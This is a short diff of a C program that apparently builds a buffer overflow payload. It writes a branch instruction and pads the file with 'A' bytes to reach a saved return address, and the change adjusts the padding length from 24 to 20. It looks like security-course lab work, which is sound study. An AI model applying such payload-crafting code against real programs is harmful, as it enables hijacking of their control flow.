@@ -34,7 +34,7 @@ int main(void) {
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
     
     /*Padding to fill buffer and reach the return address*/
-    while(i < 24) {
+    while(i < 20) {
         putc('A', dataAplus);
         i++;
     }
